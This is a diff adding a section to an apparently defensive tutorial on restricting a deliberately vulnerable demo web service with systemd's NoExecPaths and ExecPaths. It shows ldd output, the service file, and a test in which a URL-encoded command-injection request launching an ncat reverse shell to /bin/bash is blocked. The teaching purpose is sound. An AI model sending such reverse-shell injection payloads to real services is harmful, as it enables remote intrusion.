@@ -880,3 +880,80 @@ Now, if you go back you can see a connection has been established.
   fedora:x:1000:1000:fedora Cloud User:/home/fedora:/bin/bash
 
 See if you can esclate to `root` from this shell :)
+
+Allowed Executables
+-------------------
+
+We can further lock down the service using the `NoExecPaths` and `ExecPaths`
+configuration. `NoExecPaths=` will let us set paths from which (if directory) or
+the files themselves will not be allowed to execute. And then we can only
+mention the execuables we want to allow. This should also include any library
+which will be mapped to memory as exec.
+
+In our case we have to find out the libraries we are linked against and same for
+any executable we need, that is `/usr/bin/date`.  Let us use `ldd` command to
+find this information. We will also need `/usr/lib/systemd/systemd` in the allow list.
+
+::
+
+  $ ldd /usr/bin/date
+  linux-vdso.so.1 (0x00007ffe9c7f9000)
+  libc.so.6 => /lib64/libc.so.6 (0x00007f08ac188000)
+  /lib64/ld-linux-x86-64.so.2 (0x00007f08ac3b3000)
+  $ ldd /usr/sbin/verybad
+  linux-vdso.so.1 (0x00007ffd0b9a9000)
+  libgcc_s.so.1 => /lib64/libgcc_s.so.1 (0x00007fe39ccc4000)
+  libm.so.6 => /lib64/libm.so.6 (0x00007fe39cbe8000)
+  libc.so.6 => /lib64/libc.so.6 (0x00007fe39c9de000)
+  /lib64/ld-linux-x86-64.so.2 (0x00007fe39d082000)
+
+Let us add these in our service file & put `/` in `NoExecPaths`.
+
+.. code-block:: ini
+
+  [Unit]
+  Description=Very Bad Web Application
+  After=network.target
+
+  [Service]
+  Type=simple
+  ExecStart=/usr/sbin/verybad
+  Restart=always
+  DynamicUser=yes
+  StateDirectory=verybad
+  WorkingDirectory=/var/lib/verybad
+  NoExecPaths=/
+  ExecPaths=/usr/sbin/verybad /usr/lib/systemd/systemd /lib64/ld-linux-x86-64.so.2 /lib64/libgcc_s.so.1 /lib64/libm.so.6 /lib64/libc.so.6 /usr/bin/date
+
+  [Install]
+  WantedBy=multi-user.target
+
+
+Then `daemon-reload` & `restart` the service. & we will try the `curl` command once again.
+
+::
+
+  $ sudo systemctl daemon-reload
+  $ sudo systemctl restart verybad
+  $ curl http://localhost:8000/exec/date
+  Wed Mar 30 10:11:49 AM UTC 2022
+  $ curl http://localhost:8000/exec/ncat%20127.0.0.1%205555%20-e%20%2Fbin%2Fbash
+  <!DOCTYPE html>
+  <html lang="en">
+  <head>
+      <meta charset="utf-8">
+      <title>500 Internal Server Error</title>
+  </head>
+  <body align="center">
+      <div role="main" align="center">
+          <h1>500: Internal Server Error</h1>
+          <p>The server encountered an internal error while processing this request.</p>
+          <hr />
+      </div>
+      <div role="contentinfo" align="center">
+          <small>Rocket</small>
+      </div>
+  </body>
+  </html>
+
+To learn more read the man page via **man systemd.exec**.
